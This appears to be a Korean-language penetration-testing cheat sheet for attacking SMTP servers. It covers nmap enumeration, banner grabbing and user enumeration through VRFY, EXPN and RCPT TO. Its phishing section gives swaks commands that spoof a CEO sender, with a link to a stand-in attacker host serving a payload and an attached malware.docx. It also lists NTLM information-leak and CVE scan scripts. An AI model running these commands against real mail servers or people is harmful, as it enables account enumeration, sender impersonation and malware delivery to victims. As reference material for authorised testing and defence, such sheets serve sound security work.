# SMTP (25/465/587)

Simple Mail Transfer Protocol. 메일 전송. 사용자 열거, 메일 스푸핑, 피싱에 활용.

---

## 열거

```bash
nmap -sV -sC -p 25,465,587 TARGET
nmap --script=smtp-commands,smtp-ntlm-info -p 25 TARGET

# 배너 그래빙
nc -nv TARGET 25
telnet TARGET 25
```

---

## 사용자 열거

```bash
# VRFY 명령 (사용자 존재 확인)
telnet TARGET 25
VRFY admin
VRFY root
VRFY user

# EXPN (메일링 리스트 확장)
EXPN admin

# RCPT TO (수신자 확인)
MAIL FROM:<test@test.com>
RCPT TO:<admin@domain.com>
# 250 = 존재, 550 = 미존재

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET -D domain.com

# nmap
nmap --script=smtp-enum-users -p 25 TARGET
```

---

## 메일 전송 (피싱/스푸핑)

```bash
# Open Relay 확인
nmap --script=smtp-open-relay -p 25 TARGET

# swaks (Swiss Army Knife for SMTP)
swaks --to victim@domain.com --from ceo@domain.com --server TARGET \
  --header "Subject: Urgent" --body "Click here: http://attacker.com/payload"

# 첨부 파일 포함
swaks --to victim@domain.com --from ceo@domain.com --server TARGET \
  --header "Subject: Invoice" --attach @malware.docx

# 인증 필요 시
swaks --to victim@domain.com --from user@domain.com --server TARGET \
  --auth LOGIN --auth-user user@domain.com --auth-password pass
```

---

## NTLM 정보 노출

```bash
# SMTP NTLM 인증을 통한 내부 정보 노출
nmap --script=smtp-ntlm-info -p 25 TARGET
# → 내부 호스트명, 도메인, DNS 이름 등 노출
```

---

## Nmap NSE

```bash
nmap --script=smtp-commands -p 25 TARGET
nmap --script=smtp-enum-users -p 25 TARGET
nmap --script=smtp-open-relay -p 25 TARGET
nmap --script=smtp-vuln-cve2010-4344 -p 25 TARGET
```
